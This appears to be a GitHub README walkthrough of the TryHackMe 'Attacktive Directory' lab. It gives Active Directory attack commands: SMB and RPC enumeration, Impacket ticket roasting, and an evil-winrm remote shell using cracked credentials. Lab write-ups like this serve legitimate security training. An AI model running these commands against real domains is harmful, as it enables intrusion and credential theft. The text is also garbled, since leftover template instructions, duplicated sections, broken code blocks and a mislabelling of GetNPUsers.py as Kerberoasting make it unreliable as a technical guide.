# 🏢 TryHackMe: Attacktive Directory

This repository contains my detailed write-up of the **"Attacktive Directory"** room on TryHackMe. This room focuses on **Active Directory enumeration and exploitation**, using common misconfigurations and techniques seen in real-world enterprise environments.

---

## 🧾 Room Info

- **Platform**: TryHackMe  
- **Room**: [Attacktive Directory](https://tryhackme.com/room/attacktivedirectory)  
- **Difficulty**: Medium  
- **Focus**: Active Directory, SMB enumeration, Kerberoasting, Privilege Escalation  
- **Status**: ✅ Completed

---

## 🛠️ Tools Used

- `nmap`
- `smbclient`
- `enum4linux`
- `rpcclient`
- `crackmapexec`
- `impacket` (`GetNPUsers.py`, `GetUserSPNs.py`)
- `john` or `hashcat`
- `evil-winrm`

---

## 🔍 1. Enumeration

### 🔎 Nmap Scan
```bash
nmap -sC -sV -T4 -p- 10.10.x.x

- **Explanation**:  
  - **Nmap Scan**: Scans the network to find out which ports and services are open on the target.
  - The IP address `10.10.x.x` should be replaced with the actual IP of the target.

---

#### 6. **SMB & LDAP Enumeration**  
Here, you'll explain how you gathered information about users and resources using **SMB** and **LDAP**.

```markdown
## 📁 2. SMB & LDAP Enumeration

Using **enum4linux**, I performed SMB enumeration to gather information about users and groups on the domain:

```bash
enum4linux -a 10.10.x.x
rpcclient -U "" 10.10.x.x
> enumdomusers
smbclient -L \\\\10.10.x.x\\

- **Explanation**:  
  - **enum4linux**: A tool used to enumerate information from SMB shares.
  - **rpcclient**: A tool used to interact with Windows SMB.
  - **smbclient**: A command-line tool to list shared folders on Windows machines.

---

#### 7. **Kerberoasting**  
Explain how you performed **Kerberoasting** to extract service account credentials.

```markdown
## 🔐 3. Kerberoasting

### Kerberoasting Attack

I used **GetNPUsers.py** from the **Impacket** suite to attempt Kerberoasting:

```bash
GetNPUsers.py -no-pass -dc-ip 10.10.x.x 'domain.local/username'
GetUserSPNs.py domain.local/username:password -dc-ip 10.10.x.x

- **Explanation**:  
  - **Kerberoasting** is an attack where you request service tickets (TGS) and try to crack them to get the service account passwords.
  - **Impacket** tools are used for this process.

---

#### 8. **Gaining Access**  
This is where you explain how you exploited the information you gathered to **gain access** to the system.

```markdown
## 💥 4. Gaining Access

After successfully cracking some SPNs, I obtained valid credentials and used **Evil-WinRM** to gain a remote PowerShell shell on the machine:

```bash
evil-winrm -i 10.10.x.x -u user -p password
GetUserSPNs.py domain.local/username:password -dc-ip 10.10.x.x

- **Explanation**:  
  - **Kerberoasting** is an attack where you request service tickets (TGS) and try to crack them to get the service account passwords.
  - **Impacket** tools are used for this process.

---

#### 8. **Gaining Access**  
This is where you explain how you exploited the information you gathered to **gain access** to the system.

```markdown
## 💥 4. Gaining Access

After successfully cracking some SPNs, I obtained valid credentials and used **Evil-WinRM** to gain a remote PowerShell shell on the machine:

```bash
evil-winrm -i 10.10.x.x -u user -p password

- **Explanation**:  
  - **Evil-WinRM** is a tool used to get remote access to Windows machines via **WinRM**.

---

#### 9. **Privilege Escalation**  
Explain how you elevated your privileges once you had access to the system.

```markdown
## 🔼 5. Privilege Escalation

Once I had access, I used several techniques to escalate privileges:
- **Unquoted service paths**
- **Using tools like winPEAS and Seatbelt.exe** to identify possible privilege escalation vectors
- **Exploiting service misconfigurations** to escalate to **SYSTEM** privileges
## 🧠 Key Takeaways

- **Kerberoasting** is an effective attack technique for obtaining service account credentials.
- **Impacket**'s tools like `GetNPUsers.py` and `GetUserSPNs.py` are invaluable for **Active Directory enumeration** and **Kerberoasting**.
- **Evil-WinRM** is a great tool for obtaining remote access to Windows machines post-exploitation.
- Privilege escalation often relies on finding **misconfigurations** or vulnerabilities in Windows services.
## 📬 Contact

- **GitHub**: [Your GitHub](https://github.com/tanmoydaw26)
